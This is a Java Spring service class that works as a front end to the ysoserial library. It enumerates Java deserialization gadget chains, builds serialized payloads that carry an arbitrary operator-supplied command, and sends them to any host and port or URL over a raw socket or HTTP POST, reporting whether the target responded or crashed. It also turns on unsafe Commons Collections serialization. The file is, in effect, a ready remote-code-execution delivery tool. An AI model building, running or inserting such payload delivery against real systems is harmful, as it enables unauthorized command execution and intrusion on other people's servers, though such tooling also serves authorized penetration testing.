package com.yulock.payload.service.impl;

import com.yulock.payload.service.PayloadService;
import lombok.extern.slf4j.Slf4j;
import org.springframework.stereotype.Service;
import ysoserial.payloads.ObjectPayload;
import ysoserial.Serializer;

import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.URL;
import java.net.SocketTimeoutException;
import java.util.*;

@Slf4j
@Service
public class PayloadServiceImpl implements PayloadService {

    static {
        System.setProperty("org.apache.commons.collections.enableUnsafeSerialization", "true");
    }

    @Override
    public List<Map<String, Object>> getAvailableGadgets() {
        List<Map<String, Object>> gadgets = new ArrayList<>();

        Set<Class<? extends ObjectPayload>> payloadClasses = ObjectPayload.Utils.getPayloadClasses();
        for (Class<? extends ObjectPayload> clazz : payloadClasses) {
            try {
                Map<String, Object> gadget = new HashMap<>();
                gadget.put("name", clazz.getSimpleName());
                gadget.put("className", clazz.getName());

                ysoserial.payloads.annotation.Dependencies deps = clazz.getAnnotation(ysoserial.payloads.annotation.Dependencies.class);
                if (deps != null) {
                    gadget.put("dependencies", String.join(", ", deps.value()));
                }

                ysoserial.payloads.annotation.Authors authors = clazz.getAnnotation(ysoserial.payloads.annotation.Authors.class);
                if (authors != null) {
                    String[] authorList = authors.value();
                    for (int i = 0; i < authorList.length; i++) {
                        authorList[i] = "@" + authorList[i];
                    }
                    gadget.put("authors", String.join(", ", authorList));
                }

                gadgets.add(gadget);
            } catch (Exception e) {
                log.warn("Failed to load gadget: {}", clazz.getName(), e);
            }
        }

        gadgets.sort(Comparator.comparing(m -> (String) m.get("name")));
        return gadgets;
    }

    @Override
    public byte[] generatePayload(String gadgetName, String command) {
        try {
            Class<? extends ObjectPayload> payloadClass = ObjectPayload.Utils.getPayloadClass(gadgetName);
            if (payloadClass == null) {
                throw new IllegalArgumentException("Unknown gadget: " + gadgetName);
            }

            ObjectPayload payload = payloadClass.newInstance();
            Object object = payload.getObject(command);

            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            Serializer.serialize(object, baos);

            ObjectPayload.Utils.releasePayload(payload, object);

            return baos.toByteArray();
        } catch (Exception e) {
            log.error("Failed to generate payload", e);
            throw new RuntimeException("Failed to generate payload: " + e.getMessage(), e);
        }
    }

    @Override
    public String testPayload(byte[] payload, String host, Integer port, String url, String type) {
        try {
            if ("socket".equals(type)) {
                return testViaSocket(payload, host, port);
            } else if ("url".equals(type)) {
                return testViaUrl(payload, url);
            } else {
                return testViaDeserialization(payload);
            }
        } catch (Exception e) {
            log.error("Payload test failed", e);
            return "Test failed: " + e.getMessage();
        }
    }

    private String testViaSocket(byte[] payload, String host, int port) {
        long startTime = System.currentTimeMillis();
        StringBuilder result = new StringBuilder();
        Socket socket = null;

        try {
            socket = new Socket();
            socket.setSoTimeout(5000);
            socket.connect(new InetSocketAddress(host, port), 5000);

            OutputStream os = socket.getOutputStream();
            os.write(payload);
            os.flush();

            long sentTime = System.currentTimeMillis();
            result.append(String.format("[OK] Payload sent to %s:%d (%d bytes in %dms)",
                    host, port, payload.length, sentTime - startTime));

            try {
                InputStream is = socket.getInputStream();
                byte[] buf = new byte[4096];
                int len = is.read(buf);
                if (len > 0) {
                    byte[] response = new byte[len];
                    System.arraycopy(buf, 0, response, 0, len);
                    String hex = bytesToHex(response, 256);
                    String text = safeToString(response, 256);
                    result.append(String.format("\n[RESP] Received %d bytes:\n  Hex: %s\n  Text: %s",
                            len, hex, text));
                } else {
                    result.append("\n[RESP] No response data (connection closed)");
                }
            } catch (SocketTimeoutException e) {
                result.append("\n[RESP] Read timeout (5s) - target may have crashed or ignored the payload");
            } catch (Exception e) {
                result.append("\n[RESP] Read failed: " + e.getMessage());
            }

        } catch (Exception e) {
            result.append(String.format("[FAIL] %s:%d - %s", host, port, e.getMessage()));
        } finally {
            if (socket != null) {
                try { socket.close(); } catch (Exception ignored) {}
            }
        }

        long totalTime = System.currentTimeMillis() - startTime;
        result.append(String.format("\n[INFO] Total test time: %dms", totalTime));
        return result.toString();
    }

    private String testViaUrl(byte[] payload, String targetUrl) {
        long startTime = System.currentTimeMillis();
        StringBuilder result = new StringBuilder();

        try {
            URL url = new URL(targetUrl);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setConnectTimeout(5000);
            conn.setReadTimeout(10000);
            conn.setRequestProperty("Content-Type", "application/octet-stream");
            conn.setRequestProperty("Content-Length", String.valueOf(payload.length));

            try (OutputStream os = conn.getOutputStream()) {
                os.write(payload);
                os.flush();
            }

            long sentTime = System.currentTimeMillis();
            int responseCode = conn.getResponseCode();
            String responseMsg = readFullResponse(conn);

            result.append(String.format("[OK] HTTP %d - Payload sent to %s (%d bytes in %dms)",
                    responseCode, targetUrl, payload.length, sentTime - startTime));

            if (!responseMsg.isEmpty()) {
                result.append("\n[RESP] Response body:\n").append(responseMsg);
            }

            long totalTime = System.currentTimeMillis() - startTime;
            result.append(String.format("\n[INFO] Total test time: %dms", totalTime));

        } catch (Exception e) {
            result.append(String.format("[FAIL] %s - %s", targetUrl, e.getMessage()));
        }

        return result.toString();
    }

    private String readFullResponse(HttpURLConnection conn) {
        try (InputStream is = conn.getErrorStream() != null ? conn.getErrorStream() : conn.getInputStream()) {
            if (is == null) return "";
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            byte[] buf = new byte[4096];
            int len;
            while ((len = is.read(buf)) != -1) {
                baos.write(buf, 0, len);
            }
            byte[] data = baos.toByteArray();
            return safeToString(data, 2000);
        } catch (Exception e) {
            return "(read error: " + e.getMessage() + ")";
        }
    }

    private String testViaDeserialization(byte[] payload) {
        StringBuilder sb = new StringBuilder();
        sb.append(String.format("[INFO] Payload generated successfully (%d bytes)\n", payload.length));
        sb.append("[INFO] No remote target configured - payload was not sent\n");
        sb.append("[INFO] To verify: send this payload to a vulnerable deserialization endpoint");
        return sb.toString();
    }

    private String bytesToHex(byte[] bytes, int maxLen) {
        int len = Math.min(bytes.length, maxLen);
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < len; i++) {
            sb.append(String.format("%02x", bytes[i] & 0xFF));
        }
        if (bytes.length > maxLen) {
            sb.append("...");
        }
        return sb.toString();
    }

    private String safeToString(byte[] bytes, int maxLen) {
        int len = Math.min(bytes.length, maxLen);
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < len; i++) {
            byte b = bytes[i];
            if (b >= 0x20 && b <= 0x7E) {
                sb.append((char) b);
            } else if (b == '\n') {
                sb.append("\\n");
            } else if (b == '\r') {
                sb.append("\\r");
            } else if (b == '\t') {
                sb.append("\\t");
            } else {
                sb.append('.');
            }
        }
        if (bytes.length > maxLen) {
            sb.append("...");
        }
        return sb.toString();
    }
}
